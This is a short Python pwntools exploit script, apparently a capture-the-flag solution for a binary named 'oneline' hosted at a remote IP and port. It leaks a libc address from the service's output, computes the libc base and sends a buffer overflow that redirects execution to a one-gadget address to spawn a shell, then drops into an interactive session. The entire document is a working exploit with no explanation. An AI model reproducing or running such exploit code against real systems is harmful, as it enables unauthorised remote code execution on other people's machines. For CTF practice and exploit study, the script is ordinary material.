import sys
from pwn import *

ONE_GADGET_RCE = int(sys.argv[1])

target = ELF('./oneline')

libc = ELF('./libc-2.27.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

r = remote('153.120.129.186', 10000)
# r = process('./oneline')

r.sendlineafter('>> ', 'hoge')

LIBC_BASE = u64(r.recv(0x28)[-8:]) - libc.symbols['write']

payload = 'A' * 0x20 + p64(LIBC_BASE + ONE_GADGET_RCE)
r.sendlineafter('>> ', payload)

r.interactive()
